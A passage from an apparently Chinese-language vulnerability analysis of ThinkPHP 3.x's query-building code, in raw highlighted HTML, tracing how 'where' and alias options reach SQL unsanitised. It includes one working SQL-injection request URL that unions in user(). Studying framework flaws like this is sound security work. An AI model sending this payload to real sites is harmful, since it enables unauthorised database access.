variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">// 自动获取表名</span>        <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">]</span>   <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getTableName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fields</span>             <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fields</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span>        <span class="token variable">$fields</span>             <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getDbFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 数据表别名</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">]</span>  <span class="token operator">.=</span>   <span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//直接进行了拼接</span>    <span class="token punctuation">}</span>    <span class="token comment">// 记录操作的模型名称</span>    <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'model'</span><span class="token punctuation">]</span>       <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token comment">// 字段类型验证， 如果不设置where，或者设置为字符串，这里即可绕过</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$fields</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 对数组查询条件进行字段类型检查</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=&gt;</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$key</span>            <span class="token operator">=</span>   <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$fields</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_scalar</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_parseType</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">'_'</span> <span class="token operator">!=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'('</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'strict'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">E</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_ERROR_QUERY_EXPRESS_'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">':['</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token operator">.</span><span class="token string single-quoted-string">'=&gt;'</span><span class="token operator">.</span><span class="token variable">$val</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                 <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">// 查询过后清空sql表达式组装 避免影响下次查询</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span>  <span class="token operator">=</span>   <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 表达式过滤</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_options_filter</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$options</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后返回，ThinkPHP\Library\Think\Model.class.php  </p><pre class="line-numbers language-none"><code class="language-none">$options    =  $this-&gt;_parseOptions($options);....// 重点关注$resultSet  = $this-&gt;db-&gt;select($options);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>跟进 $this-&gt;db-&gt;select($options)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildSelectSql</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 生成执行sql语句</span>    <span class="token variable">$result</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token argument-name">true</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 执行sql语句</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进sql语句构建函数  <code>buildSelectSql</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">buildSelectSql</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 根据页数计算limit,分页控制，这里强制转换成整数了，无法利用</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span><span class="token variable">$listRows</span><span class="token punctuation">)</span>   <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$page</span>    <span class="token operator">=</span>  <span class="token variable">$page</span><span class="token operator">&gt;</span><span class="token number">0</span> <span class="token operator">?</span> <span class="token variable">$page</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$listRows</span><span class="token operator">=</span>  <span class="token variable">$listRows</span><span class="token operator">&gt;</span><span class="token number">0</span> <span class="token operator">?</span> <span class="token variable">$listRows</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$offset</span>  <span class="token operator">=</span>  <span class="token variable">$listRows</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span>  <span class="token variable">$offset</span><span class="token operator">.</span><span class="token string single-quoted-string">','</span><span class="token operator">.</span><span class="token variable">$listRows</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$sql</span>  <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseSql</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">selectSql</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续跟进 <code>parseSql</code> 方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">parseSql</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$sql</span>   <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%TABLE%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%DISTINCT%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%FIELD%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%JOIN%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%WHERE%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%GROUP%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%HAVING%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%ORDER%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%LIMIT%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%UNION%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%LOCK%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%COMMENT%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%FORCE%'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseDistinct</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'distinct'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'distinct'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseField</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseJoin</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseGroup</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'group'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'group'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseHaving</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'having'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'having'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseLimit</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseUnion</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseLock</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lock'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lock'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseForce</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'force'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'force'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里对SQL模板语句进行替换, 皆未进行替换。</p><p>以where部分为例,<code>parseWhere</code> 方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// 直接使用字符串条件</span>            <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token comment">// 使用数组表达式</span><span class="token operator">...</span><span class="token operator">...</span>             <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$where</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=&gt;</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                   <span class="token variable">$key</span>  <span class="token operator">=</span> <span class="token string single-quoted-string">'_complex'</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token comment">// 解析特殊条件表达式</span>                   <span class="token variable">$whereStr</span>   <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseThinkWhere</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                   <span class="token operator">...</span><span class="token operator">...</span>                <span class="token punctuation">}</span>             <span class="token punctuation">}</span><span class="token punctuation">}</span>               <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当where部分为字符串时，直接进行了拼接，所以最简单粗暴的就直接构造</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=0 union select 1,2,user() %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当where部分为 数组表达式时，遍历数组key、value值，当key以_开头时进入特殊表达式解析函数<code>parseThinkWhere</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseThinkWhere</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$whereStr</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'_string'</span><span class="token punctuation">:</span>            <span class="token comment">// 字符串模式查询条件</span>            <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'_complex'</span><span class="token punctuation">:</span>            <span class="token comment">// 复合查询条件</span>            <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'_query'</span><span class="token punctuation">:</span>            <span class="token comment">// 字符串模式查询条件</span>            <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_logic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$op</span>   <span class="token operator">=</span>  <span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_logic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>                <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_logic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token variable">$op</span>   <span class="token operator">=</span>  <span class="token string single-quoted-string">' AND '</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$array</span>   <span class="token operator">=</span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$where</span> <span class="token keyword">as</span> <span class="token 